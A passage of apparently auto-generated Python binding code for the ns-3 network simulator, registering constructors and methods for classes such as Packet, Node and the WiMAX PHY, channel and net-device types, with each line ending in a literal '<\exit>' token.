[param('uint32_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('GetId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNApplications',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('RegisterDeviceAdditionListener',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])<\exit>
cls.add_method('RegisterProtocolHandler',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler'), param('uint16_t', 'protocolType'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('UnregisterDeviceAdditionListener',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])<\exit>
cls.add_method('UnregisterProtocolHandler',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('DoStart',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectFactoryChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectFactoryChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3ObjectFactoryValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectFactoryValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::ObjectFactory const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::ObjectFactory',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::ObjectFactory const &', 'value')])<\exit>
return<\exit>
def register_Ns3OutputStreamWrapper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OutputStreamWrapper const &', 'arg0')])<\exit>
cls.add_constructor([param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode')])<\exit>
cls.add_constructor([param('std::ostream *', 'os')])<\exit>
cls.add_method('GetStream',<\exit>
'std::ostream *',<\exit>
[])<\exit>
return<\exit>
def register_Ns3Packet_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Packet const &', 'o')])<\exit>
cls.add_constructor([param('uint32_t', 'size')])<\exit>
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size'), param('bool', 'magic')])<\exit>
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'packet')])<\exit>
cls.add_method('AddByteTag',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('AddHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header')])<\exit>
cls.add_method('AddPacketTag',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('AddPaddingAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('AddTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer')])<\exit>
cls.add_method('BeginItem',<\exit>
'ns3::PacketMetadata::ItemIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'void',<\exit>
[param('std::ostream *', 'os'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'length')],<\exit>
is_const=True)<\exit>
cls.add_method('EnableChecking',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('EnablePrinting',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('FindFirstMatchingByteTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetByteTagIterator',<\exit>
'ns3::ByteTagIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNixVector',<\exit>
'ns3::Ptr< ns3::NixVector >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketTagIterator',<\exit>
'ns3::PacketTagIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekData',<\exit>
'uint8_t const *',<\exit>
[],<\exit>
deprecated=True, is_const=True)<\exit>
cls.add_method('PeekHeader',<\exit>
'uint32_t',<\exit>
[param('ns3::Header &', 'header')],<\exit>
is_const=True)<\exit>
cls.add_method('PeekPacketTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('PeekTrailer',<\exit>
'uint32_t',<\exit>
[param('ns3::Trailer &', 'trailer')])<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('PrintByteTags',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('PrintPacketTags',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAllByteTags',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('RemoveAllPacketTags',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveHeader',<\exit>
'uint32_t',<\exit>
[param('ns3::Header &', 'header')])<\exit>
cls.add_method('RemovePacketTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')])<\exit>
cls.add_method('RemoveTrailer',<\exit>
'uint32_t',<\exit>
[param('ns3::Trailer &', 'trailer')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
cls.add_method('SetNixVector',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::NixVector >', 'arg0')])<\exit>
return<\exit>
def register_Ns3RandomVariableChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariableChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3RandomVariableValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariableValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::RandomVariable const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::RandomVariable',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::RandomVariable const &', 'value')])<\exit>
return<\exit>
def register_Ns3SimpleOfdmWimaxPhy_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxPhy const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char *', 'tracesPath')])<\exit>
cls.add_method('ActivateLoss',<\exit>
'void',<\exit>
[param('bool', 'loss')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBandwidth',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNoiseFigure',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPhyType',<\exit>
'ns3::WimaxPhy::PhyType',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTxPower',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('NotifyRxBegin',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyRxDrop',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyRxEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyTxBegin',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyTxDrop',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyTxEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::SendParams *', 'params')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'BW')])<\exit>
cls.add_method('SetNoiseFigure',<\exit>
'void',<\exit>
[param('double', 'nf')])<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst >, ns3::Ptr< ns3::WimaxConnection >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('SetSNRToBlockErrorRateTracesPath',<\exit>
'void',<\exit>
[param('char *', 'tracesPath')])<\exit>
cls.add_method('SetTxPower',<\exit>
'void',<\exit>
[param('double', 'txPower')])<\exit>
cls.add_method('StartReceive',<\exit>
'void',<\exit>
[param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPower'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrSymbols',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetDataRates',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetPhyParameters',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3TimeChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TimeChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3TimeValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TimeValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Time const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Time const &', 'value')])<\exit>
return<\exit>
def register_Ns3TypeIdChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeIdChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3TypeIdValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeIdValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::TypeId const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::TypeId const &', 'value')])<\exit>
return<\exit>
def register_Ns3UintegerValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::UintegerValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint64_t const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint64_t const &', 'value')])<\exit>
return<\exit>
def register_Ns3WimaxChannel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxChannel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxNetDevice_methods(root_module, cls):<\exit>
cls.add_static_attribute('m_direction', 'uint8_t', is_const=False)<\exit>
cls.add_static_attribute('m_frameStartTime', 'ns3::Time', is_const=False)<\exit>
cls.add_instance_attribute('m_traceRx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)<\exit>
cls.add_instance_attribute('m_traceTx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetTtg',<\exit>
'void',<\exit>
[param('uint16_t', 'ttg')])<\exit>
cls.add_method('GetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetRtg',<\exit>
'void',<\exit>
[param('uint16_t', 'rtg')])<\exit>
cls.add_method('GetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])<\exit>
cls.add_method('SetPhy',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_method('GetPhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetChannel',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'wimaxChannel')])<\exit>
cls.add_method('GetChannel',<\exit>
'uint64_t',<\exit>
[param('uint8_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrFrames',<\exit>
'void',<\exit>
[param('uint32_t', 'nrFrames')])<\exit>
cls.add_method('GetNrFrames',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'address')])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetState',<\exit>
'void',<\exit>
[param('uint8_t', 'state')])<\exit>
cls.add_method('GetState',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInitialRangingConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBroadcastConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCurrentDcd',<\exit>
'void',<\exit>
[param('ns3::Dcd', 'dcd')])<\exit>
cls.add_method('GetCurrentDcd',<\exit>
'ns3::Dcd',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCurrentUcd',<\exit>
'void',<\exit>
[param('ns3::Ucd', 'ucd')])<\exit>
cls.add_method('GetCurrentUcd',<\exit>
'ns3::Ucd',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConnectionManager',<\exit>
'ns3::Ptr< ns3::ConnectionManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetConnectionManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::ConnectionManager >', 'connectionManager')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBurstProfileManager',<\exit>
'ns3::Ptr< ns3::BurstProfileManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBurstProfileManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BurstProfileManager >', 'burstProfileManager')])<\exit>
cls.add_method('GetBandwidthManager',<\exit>
'ns3::Ptr< ns3::BandwidthManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBandwidthManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BandwidthManager >', 'bandwidthManager')])<\exit>
cls.add_method('CreateDefaultConnections',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ForwardUp',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ForwardDown',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetName',<\exit>
'void',<\exit>
[param('std::string const', 'name')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetIfIndex',<\exit>
'void',<\exit>
[param('uint32_t const', 'index')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetIfIndex',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetPhyChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAddress',<\exit>
'void',<\exit>
[param('ns3::Address', 'address')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAddress',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetMtu',<\exit>
'bool',<\exit>
[param('uint16_t const', 'mtu')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetMtu',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsLinkUp',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_virtual=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('MakeMulticastAddress',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPointToPoint',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Send',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNode',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNode',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('NeedsArp',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AddLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SendFrom',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetPromiscReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetPromiscReceiveCallback',<\exit>
'ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[])<\exit>
cls.add_method('SupportsSendFrom',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
